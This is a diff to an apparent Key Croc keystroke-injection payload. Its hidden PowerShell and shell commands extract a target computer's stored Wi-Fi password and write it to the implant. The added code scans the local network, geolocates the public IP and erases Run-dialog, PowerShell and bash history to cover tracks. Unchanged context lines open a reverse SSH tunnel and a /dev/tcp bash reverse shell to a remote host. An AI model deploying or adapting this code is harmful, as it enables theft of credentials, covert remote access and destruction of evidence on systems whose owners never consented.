@@ -1,12 +1,24 @@
 # Title:           Croc_Getonline
 # Description:     Attempt to connect Keycroc automatically to target wifi access point
-#                  Save to tools/wifipass.txt and tools/old_wifipass.txt
+#                  Save to tools/wifipass.txt, tools/old_wifipass.txt & recon loot to /root/udisk/tools/Target_SSID.txt
 # Author:          spywill
-# Version:         4.0
+# Version:         4.1
 # Category:        Key Croc
 # Props:           Cribbit, Lodrix, potong, RootJunky, dark_pyrro
 
-MATCH (getonline_W|getonline_R|getonline_L|getonline_N|getonline_F|getonline_K|getonline_S|getonline_H)
+#   getonline_W <-- MATCH word for windows, Attempt connection to access point
+#   getonline_L <-- MATCH word for Linux, Attempt connection to access point
+#   getonline_R <-- MATCH word for Raspberry pi, Attempt connection to access point
+#   getonline_N <-- MATCH word for connecting to known SSID ( EDIT PAYLOAD )
+#   getonline_F <-- MATCH word for reset wlan0 interface to last known SSID
+#   getonline_K <-- MATCH word for killing keycroc wlan0 interface
+#   getonline_S <-- MATCH word for entering ATTACKMODE HID STORAGE
+#   getonline_H <-- MATCH word for entering ATTACKMODE HID
+#   getonline_P <-- MATCH word for entering ATTACKMODE HID SERIAL
+#   getonline_A <-- MATCH word for entering ATTACKMODE HID AUTO_ETHERNET
+#   getonline_X <-- MATCH word for Remove Croc_Getonline payload, contents and reboot
+
+MATCH (getonline_W|getonline_R|getonline_L|getonline_N|getonline_F|getonline_K|getonline_S|getonline_H|getonline_P|getonline_A|getonline_X)
 QUACK LOCK
 
 #---> Edit payload option below
@@ -24,12 +36,36 @@ port=7000
 known_ssid=EDIT_KNOWN_SSID_HERE
 known_ssid_password=EDIT_KNOWN_SSID_PASSWORD_HERE
 
+#---> Edit recon scan on/off below
+recon=off
+recon_loot=/root/udisk/tools/Target_SSID.txt
+
 #---> Edit Linux target password below
 if [ -f ~/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered ]; then
 	target_password=$(sed '$!d' ~/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)
 else
 	target_password=ENTER_LINUX_PASSWORD_HERE
 fi
+
+recon_scan() {
+	if [ "$recon" = "on" ]; then
+		if [ "$LOOT" = "getonline_W" ]; then
+			QUACK STRING "ipconfig /all | Out-File -Encoding UTF8 \"\$MOUNT_POINT\tools\Target_SSID.txt\""
+			QUACK ENTER
+			QUACK DELAY 2000
+		elif [ "$LOOT" = "getonline_R" ] || [ "$LOOT" = "getonline_L" ]; then
+			QUACK STRING "ifconfig -a > \"\$MOUNT_POINT/tools/Target_SSID.txt\""
+			QUACK ENTER
+			QUACK DELAY 2000
+		else
+			:
+		fi
+	elif [ "$recon" = "off" ]; then
+		:
+	else
+		:
+	fi
+}
 
 ENTER_STORAGE() {
 	if [ -f ~/udisk$wifi_pass ]; then
@@ -50,6 +86,23 @@ RESET_PAYLOAD() {
 	RELOAD_PAYLOADS
 }
 
+CLEAN_UP() {
+	if [ "$LOOT" = "getonline_W" ]; then
+		QUACK STRING "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*'"
+		QUACK ENTER
+		QUACK DELAY 2000
+		QUACK STRING "Clear-History ; Remove-Item \"\$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt\""
+		QUACK ENTER
+		QUACK DELAY 2000
+	elif [ "$LOOT" = "getonline_R" ] || [ "$LOOT" = "getonline_L" ]; then
+		QUACK STRING "history -c ; rm -f ~/.bash_history"
+		QUACK ENTER
+		QUACK DELAY 2000
+	else
+		:
+	fi
+}
+
 case $LOOT in
 	getonline_W)
 		ENTER_STORAGE
@@ -58,7 +111,7 @@ case $LOOT in
 		QUACK STRING "powershell -NoP -NonI -W Hidden"
 		QUACK ENTER
 		QUACK DELAY 5000
-		QUACK STRING "\$MOUNT_POINT = Join-Path (Get-WmiObject -Class win32_volume -Filter 'label=\"KeyCroc\"').DriveLetter \"$wifi_pass\""
+		QUACK STRING "\$MOUNT_POINT = (Get-WmiObject -Class win32_volume -Filter 'label=\"KeyCroc\"').DriveLetter"
 		QUACK ENTER
 		QUACK DELAY 3000
 		QUACK STRING "\$currentSSID = (netsh wlan show interfaces | Select-String \"SSID\")[0].ToString().Trim() -replace 'SSID\s+:\s+'"
@@ -67,9 +120,11 @@ case $LOOT in
 		QUACK STRING "\$lastObject = (netsh wlan show profile name=\"\$currentSSID\" key=clear) | Select-String \"Key Content\W+:(.+)\$\" | ForEach-Object {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=\$currentSSID;PASSWORD=\$pass }} | Select-Object -Last 1"
 		QUACK ENTER
 		QUACK DELAY 2000
-		QUACK STRING "\"\$(\$lastObject.PROFILE_NAME) \$(\$lastObject.PASSWORD)\" | Out-File -Encoding UTF8 \"\$MOUNT_POINT\""
+		QUACK STRING "\"\$(\$lastObject.PROFILE_NAME) \$(\$lastObject.PASSWORD)\" | Out-File -Encoding UTF8 \"\$MOUNT_POINT$wifi_pass\""
 		QUACK ENTER
 		QUACK DELAY 5000
+		recon_scan
+		CLEAN_UP
 		QUACK STRING "exit"
 		QUACK ENTER
 		ATTACKMODE HID
@@ -91,6 +146,8 @@ case $LOOT in
 		QUACK STRING "echo \"\$currentSSID \$SSID_password\" | tee \$MOUNT_POINT$wifi_pass"
 		QUACK ENTER
 		QUACK DELAY 3000
+		recon_scan
+		CLEAN_UP
 		QUACK STRING "umount \$MOUNT_POINT ; exit"
 		QUACK ENTER
 		ATTACKMODE HID
@@ -115,6 +172,8 @@ case $LOOT in
 		QUACK STRING "echo \"\$currentSSID \$SSID_password\" | sudo tee \$MOUNT_POINT$wifi_pass"
 		QUACK ENTER
 		QUACK DELAY 3000
+		recon_scan
+		CLEAN_UP
 		QUACK STRING "sudo umount \$MOUNT_POINT ; exit"
 		QUACK ENTER
 		ATTACKMODE HID
@@ -146,12 +205,36 @@ case $LOOT in
 		ATTACKMODE HID
 		RESET_PAYLOAD
 ;;
+	getonline_P)
+		ATTACKMODE HID SERIAL
+		RESET_PAYLOAD
+;;
+	getonline_A)
+		ATTACKMODE HID AUTO_ETHERNET
+		RESET_PAYLOAD
+;;
+	getonline_X)
+		LED R
+		rm -f /root/udisk/payloads/Croc_getonline.txt
+		rm -f /root/udisk/tools/wifipass.txt /root/udisk/tools/old_wifipass.txt
+		rm -f $recon_loot root/udisk/config.txt
+		apt -y remove sshpass
+		reboot --force
+;;
 esac
 sleep 3
 
 word_count=$(head -n 1 "/root/udisk$wifi_pass" | sed 's/^[[:space:]]*//' | sed 's/[[:space:]]*$//' | wc -w)
 if [[ $word_count -eq 2 ]]; then
-	LED SETUP
+	ssid_to_match="$(sed 's/ .*//' /root/udisk$wifi_pass)"
+	matched_ssid="$(iw dev wlan0 scan | grep -Ewi "SSID: $ssid_to_match" | sed -e 's/\tSSID: //')"
+	sleep 1
+	if [[ "$ssid_to_match" =~ "$matched_ssid" ]]; then
+		LED SETUP
+	else
+		LED R
+		RESET_PAYLOAD
+	fi
 else
 	LED R
 	RESET_PAYLOAD
@@ -208,6 +291,13 @@ if : >/dev/tcp/8.8.8.8/53; then
 		QUACK STRING "$keycroc_password"
 		QUACK ENTER
 	elif [ $option -eq 2 ]; then
+		status="$(dpkg-query -W --showformat='${db:Status-Status}' "sshpass" 2>&1)"
+		if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
+			apt -y install sshpass
+		else
+			:
+		fi
+		sleep 1
 		if nmap -sn "$remote_host_ip" | grep -q "Host is up"; then
 			cp -rp ~/.ssh ~/udisk/backup_ssh 2>/dev/null
 			rm -rf ~/.ssh 2>/dev/null
@@ -217,12 +307,14 @@ if : >/dev/tcp/8.8.8.8/53; then
 			ssh -o "StrictHostKeyChecking no" -fN -R $port:localhost:22 $remote_user_name@$remote_host_ip
 		else
 			LED R
+			sleep 1
 		fi
 	elif [ $option -eq 3 ]; then
 		if nmap -sn "$remote_host_ip" | grep -q "Host is up"; then
 			/bin/bash -i >& /dev/tcp/"$remote_host_ip"/"$port" 0>&1 &
 		else
 			LED R
+			sleep 1
 		fi
 	else
 		LED FINISH
@@ -235,3 +327,38 @@ fi
 sleep 3
 LED OFF
 QUACK UNLOCK
+
+if [ "$recon" = "on" ]; then
+	LED C SLOW
+	echo -ne "\n\nCurrent SSID:\n\n" >> $recon_loot
+	ssid_to_match=$(sed 's/ .*//' ~/udisk$wifi_pass)
+	iw dev wlan0 scan | egrep -Ewi 'BSS|signal:|SSID:|DS Parameter set:|Country:|freq:|Manufacturer:|Model Number:|Serial Number:|Device name:' | grep -A5 -B3 "SSID: $ssid_to_match" >> $recon_loot
+	echo -ne "\n\nReachable IP on local network:\n\n" >> $recon_loot
+	ip n | grep -Ei "reach|stale" | sed -r 's/\b(dev|lladdr)\b//g' >> $recon_loot
+	cat /etc/resolv.conf | grep nameserver >> $recon_loot
+
+	echo -ne "\n\nNmap with target: $network_range\n\n" >> $recon_loot
+	calculate_network_range() {
+		ip_address=$(ifconfig wlan0 | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*')
+		netmask=$(ifconfig wlan0 | grep -Eo 'Mask:([0-9]*\.){3}[0-9]*|netmask ([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*')
+		IFS=. read -r i1 i2 i3 i4 <<< "$ip_address"
+		IFS=. read -r m1 m2 m3 m4 <<< "$netmask"
+		network_range="$((i1 & m1)).$((i2 & m2)).$((i3 & m3)).0/24"
+		echo "$network_range"
+	}
+	perform_nmap_scan() {
+		local network_range=$1
+		nmap -T4 -F $network_range >> $recon_loot
+	}
+	network_range=$(calculate_network_range)
+	perform_nmap_scan $network_range
+
+	echo -ne "\n\nPUBLIC IP: $(curl -Lsf --connect-timeout 2 --max-time 2 https://checkip.amazonaws.com)\n" >> $recon_loot
+	curl -Lsf --connect-timeout 2 --max-time 2 "http://ip-api.com/line?fields=country,regionName,city,isp" | { read -r country; read -r region; read -r city; read -r isp; echo "COUNTRY: $country"; echo "REGION: $region"; echo "CITY: $city"; echo "ISP: $isp"; } >> $recon_loot
+	echo -ne "\n\n" >> $recon_loot
+	LED OFF
+elif [ "$recon" = "off" ]; then
+	:
+else
+	:
+fi
